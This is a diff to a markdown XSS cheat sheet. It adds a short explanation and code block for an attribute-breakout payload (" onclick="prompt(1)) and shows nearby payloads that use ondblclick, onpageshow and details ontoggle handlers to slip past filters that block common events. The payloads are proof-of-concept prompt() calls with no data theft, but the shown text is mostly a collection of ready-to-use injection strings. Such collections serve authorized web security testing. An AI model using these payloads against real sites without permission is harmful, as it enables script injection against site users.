@@ -16,7 +16,11 @@ Did they block onerror onload onclick? Try something like this:
 ```html
 <XXXXXXX ondblclick=prompt(1)>Some Text, Don't even care to end the tag either.
 ```
+If you just need to break out for Proof of Concept and can't use a > to close your tag, this will utilize the " in your injection.
+```html
 " onclick="prompt(1)
+```
+
 ```html
 <body onpageshow="prompt(123)">
 <details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
